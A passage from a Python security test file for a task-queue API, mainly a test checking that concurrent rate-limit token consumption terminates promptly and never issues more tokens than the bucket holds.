        f"match the X-Correlation-Id header; got body="
        f"{auto_body!r} header={auto_header!r}"
    )


# ===========================================================================
# 10. test_sec_t10_rate_consume_under_contention — SAD §6 T-10 (DoS, TB-03)
# ===========================================================================


# NFR-03 (reliability): T-10 — rate-bucket consume runs inside a single
# short transaction so a row-level lock cannot starve other workers.
def test_sec_t10_rate_consume_under_contention(monkeypatch):
    """T-10: rate-bucket consume under contention does NOT hold the row-level lock beyond the request budget.

    SAD §6 T-10 mitigation: a single short transaction per ``consume()``
    call; ``pool_pre_ping=True``; ``TASKQ_MAX_CONCURRENT`` caps the
    request fan-in. The contract observable at the repo layer: N
    concurrent consume() calls against the same bucket terminate in
    bounded wall-clock time (no deadlock, no infinite lock hold) and
    the bucket balance is decremented exactly once per successful
    consume (no double-spend despite the contention).
    """
    import tempfile as _tempfile

    import time as _time

    from taskq_api.repository.rate_repo import _SQLiteRateRepo

    # Isolated on-disk SQLite so the per-thread connection pool sees
    # the same database (an in-memory ``:memory:`` URL creates a
    # separate empty database per connection — incompatible with the
    # engine's thread-local pool).
    _tmp_db = _tempfile.NamedTemporaryFile(
        prefix="taskq-t10-", suffix=".sqlite", delete=False
    )
    _tmp_db.close()
    db_url = f"sqlite:///{_tmp_db.name}"
    try:
        repo = _SQLiteRateRepo(db_url=db_url)
        key_hash = "h-t10-contention"
        # Small bucket so the contention branch fires predictably.
        repo.get_or_create(key_hash, burst=2, refill_per_sec=0.1)

        # Lock around consume() so all N threads queue on the same row.
        lock = threading.Lock()

        def _consume() -> dict:
            # Acquire the lock OUTSIDE the consume to maximise the time
            # the row-level lock would be contested. The repo's own
            # transaction is short; we want to observe that consume()
            # returns promptly (no deadlock) even when the consumer
            # thread itself stalls.
            with lock:
                return repo.consume(key_hash, cost=1)

        N = 8
        results: list[dict] = []
        errors: list[BaseException] = []

        def _worker() -> None:
            try:
                results.append(_consume())
            except BaseException as exc:  # noqa: BLE001 — capture for the assertion below
                errors.append(exc)

        barrier = threading.Barrier(N)
        threads = [
            threading.Thread(
                target=lambda b=barrier: (b.wait() or _worker())
            )
            for _ in range(N)
        ]

        started = _time.monotonic()
        for t in threads:
            t.start()
        for t in threads:
            # Bounded join so a deadlock fails fast rather than hanging CI.
            t.join(timeout=5.0)
        elapsed = _time.monotonic() - started

        # T-10 liveness contract: every thread terminates within the bound.
        alive = [t for t in threads if t.is_alive()]
        assert not alive, (
            f"T-10 deadlock: {len(alive)} thread(s) still alive after 5s — "
            f"row-level lock held too long"
        )
        assert not errors, (
            f"T-10 unexpected exceptions: {errors!r}"
        )

        # T-10 no-overdraft contract: the bucket starts at burst=2 tokens.
        # Of N=8 consumers, exactly burst=2 (initial) plus a small refill
        # window succeed; the rest receive ``allowed=False``. We assert the
        # strict upper bound — the number of successes must NEVER exceed
        # burst + (elapsed * refill_per_sec), which for a sub-second test
        # is ``burst`` (refill is negligible at 0.1 tps).
        successes = sum(1 for r in results if r.get("allowed"))
        assert successes <= 2, (
            f"T-10 over-issue: {successes} consume() calls succeeded "
            f"against burst=2 with refill=0.1 tps and elapsed={elapsed:.3f}s; "
            f"row-level lock MUST serialise so concurrent callers cannot "
            f"double-spend. results={results!r}"
        )

        # T-10 bounded-latency contract: total wall-clock for N contending
        # consumes must be small (the row-level lock is brief).
        assert elapsed < 5.0, (
            f"T-10 latency: N={N} contending consumes took {elapsed:.3f}s; "
            f"row-level lock MUST release promptly per request budget"
        )

        # Re-entrant: another single consume after the contention must
        # still succeed (the lock is released, the bucket is reusable).
        final = repo.consume(key_hash, cost=1)
        # final is allowed iff a refill has accrued — for a sub-second test
        # the post-contention state is ``tokens < 1`` so ``allowed`` is
        # False. The contract under test is liveness, not whether this
        # specific call succeeds; we only assert the call returns.
        assert "allowed" in final and isinstance(final["allowed"], bool), (
            f"T-10 post-contention consume must return a structured "
            f"result; got {final!r}"
        )
    finally:
        # Drop the temp DB file regardless of pass/fail.
        try:
            os.unlink(_tmp_db.name)
        except OSError:
            pass
